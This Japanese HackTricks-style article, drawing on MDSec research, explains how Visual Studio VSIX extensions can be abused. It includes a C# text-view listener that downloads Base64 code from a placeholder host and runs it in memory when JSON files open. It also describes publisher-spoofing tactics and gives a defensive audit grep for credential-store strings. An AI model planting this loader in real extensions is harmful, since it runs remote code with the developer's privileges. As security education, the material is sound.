# Visual Studio VSIX Extension の悪用

{{#include ../banners/hacktricks-training.md}}

Visual Studio extension は、日常的なエディター操作を、ログオン中のユーザー権限でのコード実行に変える可能性があります。悪意のある VSIX、見た目が似た発行元、または侵害された extension の更新を通じて、通常のインストール経路からユーザーに到達できます。管理者プロンプトを伴うインストールは、ユーザーが同意したインストール経路であり、自動的な権限昇格ではありません。<sup>[[1]](#references)</sup>

## 実行モデル

従来の VSSDK extension は通常、`devenv.exe` 内で実行されます。新しい `VisualStudio.Extensibility` モデルでは、主に最新の .NET extension がプロセス外で実行されます。Visual Studio は専用の `Microsoft.ServiceHub.Host.Extensibility` プロセスに呼び出しを仲介し、IDE の安定性を隔離しますが、ユーザーの Windows 権限から extension をサンドボックス化するわけではありません。実行ファイル名には、`ServiceHub.Host.Extensibility.arm64.exe` のように、アーキテクチャの接尾辞が付く場合があります。<sup>[[1]](#references)[[2]](#references)</sup>

### 通常のエディター操作をトリガーにする

目立つメニューコマンドだけを公開する代わりに、extension は `ITextViewOpenClosedListener` を実装できます。`TextViewOpenedAsync` コールバックは対象となるドキュメントに対して呼び出され、`TextViewExtensionConfiguration.AppliesTo` を使って JSON などの一般的な種類にアクティベーションを限定できます。本来の formatter や linter としての機能を果たしながら、ファイルを開いたときの副作用として別の処理を実行することも可能です。<sup>[[1]](#references)[[3]](#references)</sup>

以下の簡略化したパターンは、重要な実行箇所を示しています。説明を簡潔にするため、本来の formatter とエラー処理は省略しています。<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>イベントをトリガーとするインメモリ managed assembly loader</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

このチェーンはBase64テキストをダウンロードし、アセンブリのバイト列にデコードして、collectibleな`AssemblyLoadContext`を介して`MemoryStream`から読み込みます。その後、リフレクションで取得した`EntryPoint`を、パラメーターなしまたは`string[]`を指定して呼び出し、非同期のエントリーポイントをawaitしてから、コンテキストをアンロードします。第2ステージはディスクに書き込まれませんが、VSIXとプライマリ拡張DLLはディスク上に残ります。Base64には真正性も機密性もなく、HTTPを使用するとオンパス攻撃者によるレスポンスの置き換えも可能です。<sup>[[1]](#references)</sup>

運用上のバリエーションとしては、ステージングに失敗しても告知された機能を継続できるようにすべての例外を抑制する方法や、`ITextViewChangedListener`を使って編集後にトリガーする方法があります。コードは拡張ホスト内で実行され、そのユーザーが利用可能なマネージドAPI、P/Invoke、ファイル、認証情報、子プロセスを使用できます。<sup>[[1]](#references)</sup>

ネイティブプラグインの自動読み込みを利用する、エディター固有の関連実行サーフェスについては、以下を参照してください。

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Marketplaceと配布経路の信頼悪用

VSIXは、直接共有またはフィッシングされたファイル、Web Marketplace、あるいはVisual Studioに組み込まれたMarketplaceブラウザーから届く可能性があります。主に一意性と予約語リストを適用するパブリッシャー登録では、見た目で誤認させるパブリッシャーIDが許されることがあります。すでに信頼されているパブリッシャーや拡張機能を侵害する方法は、インストール済みユーザーベースを引き継げるため、さらに効果的です。MarketplaceからインストールするとVisual Studio Installerが起動し、ダウンロードしたVSIXは一時的に`%LOCALAPPDATA%\Temp`に配置されます。`payload.vsix`も正規の用途で使われるため、ファイル名だけでは兆候になりません。<sup>[[1]](#references)</sup>

MDSecは、拡張機能を直接インストールするVisual StudioのURLプロトコルを特定できませんでした。攻撃者は依然として、ユーザーにVSIXをインストールして信頼させるか、既存の拡張機能の配布経路を侵害する必要があります。`AllUsers`パッケージはVisual Studioのインストールフォルダーにインストールされ、昇格を要求する場合がありますが、これはユーザーの同意を伴う通常のインストーラー動作であり、自動的にadministratorやSYSTEMを取得する手段ではありません。<sup>[[1]](#references)[[4]](#references)</sup>

### 大規模な静的監査

VSIXパッケージは通常ZIPコンテナーであるため、安全なMarketplaceレビューパイプラインでは、パッケージを列挙し、**拡張機能のコードを読み込まずに**展開して、マニフェストを解析し、実行可能なサーフェスを特定したうえで、`ilspycmd`を使ってマネージドアセンブリを逆コンパイルできます。一般的な同梱依存関係を除外したうえで、拡張機能独自のアセンブリを優先して調べ、認証情報ストアに関する文字列を、ファイル読み取りとネットワーク送信、エンコードと送信、ダウンロードと実行、Credential Managerとネットワークアクセス、スクリーンショットと送信などの振る舞いの組み合わせと照合します。<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

また、すべての実行面がマネージドコードであると決めつけず、ネイティブ DLL、MSBuild ターゲット、スクリプト、T4 テンプレート、インストーラーのペイロードも調査してください。不審な動作を、マニフェストに記載された目的と照らし合わせてください。テレメトリや正規のアップデーターが、データ流出やステージングのように見えることがあります。静的解析だけでは、パック済み、難読化済み、動的に解決されるコードや、休眠状態のコードを見落とします。また、最新バージョンだけを調べると、過去の悪意あるリリースを見落とします。<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Visual Studio 拡張機能の再検討](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - VisualStudio.Extensibility について](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - VSIX パッケージの構成](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET ツール](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
